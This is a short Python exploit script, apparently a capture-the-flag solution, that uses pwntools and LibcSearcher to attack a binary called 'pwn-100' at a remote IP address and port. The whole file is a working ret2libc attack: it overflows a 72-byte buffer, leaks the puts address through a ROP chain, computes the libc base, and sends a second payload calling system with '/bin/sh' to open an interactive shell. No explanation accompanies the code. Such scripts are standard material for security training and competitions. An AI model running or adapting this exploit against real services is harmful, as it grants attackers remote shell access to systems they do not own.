from pwn import *
from LibcSearcher import *

context(log_level="debug", arch="amd64", os="linux")
elf = ELF("./pwn-100")
# r = process("./pwn-100")
r = remote("61.147.171.105", 65187)
main = 0x4006b8
pop_rdi = 0x400763

rop = ROP(elf)
rop.call("puts", [elf.got["puts"]])
rop.raw(main)
payload1 = (cyclic(72) + rop.chain()).ljust(200, b"\x00")
r.send(payload1)
r.recvline()
puts = u64(r.recv()[0:6] + b"\x00\x00")
log.debug("puts: " + hex(puts))
libc = LibcSearcher("puts", puts)
libc_base = puts - libc.dump("puts")
system = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")
payload2 = cyclic(72) + p64(pop_rdi) + p64(bin_sh) + p64(system)
payload2 = payload2.ljust(200, b"\x00")
r.send(payload2)
r.interactive()
